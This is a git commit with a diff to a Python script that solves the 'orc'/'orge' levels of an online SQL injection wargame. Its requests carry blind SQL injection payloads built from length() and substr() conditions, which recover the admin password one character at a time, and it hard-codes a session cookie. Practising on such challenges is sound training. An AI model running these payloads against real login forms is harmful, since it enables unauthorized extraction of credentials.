2c4e1504e1946b43d0d63d1821748b544f01fda9
Charles <tkdals1879@gmail.com>
2021-01-21 09:56:08 +0000

    los_orge success

--- los_orc.py
+++ los_orc.py
@@ -1,6 +1,5 @@
 import requests, time
 
-
 flag = ''
 length= 0
  
@@ -9,7 +8,7 @@ session = dict(PHPSESSID="o6eanf2bo08v2saogks4o19526")
 # find the length of PW 
 for i in range(0, 20):
     try:
-        r = requests.post("https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw=' || length(pw)="+str(i)+"%23", cookies=session)
+        r = requests.post("https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=1' or id='admin' and length(pw)="+str(i)+"%23", cookies=session)
     except:
         print("exception")
         continue
@@ -22,7 +21,7 @@ print("[+]  Length of admin pw : " + str(length))
 for j in range(1, length+1):
     for i in range(48, 126):
         try:
-            r = requests.post("https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw=' || substr(pw,"+str(j)+",1) ='"+ str(chr(i)), cookies=session)
+            r = requests.post("https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=1' or id='admin' and substr(pw,"+str(j)+",1) ='"+ str(chr(i)), cookies=session)
         except:
             print("exception")
             continue
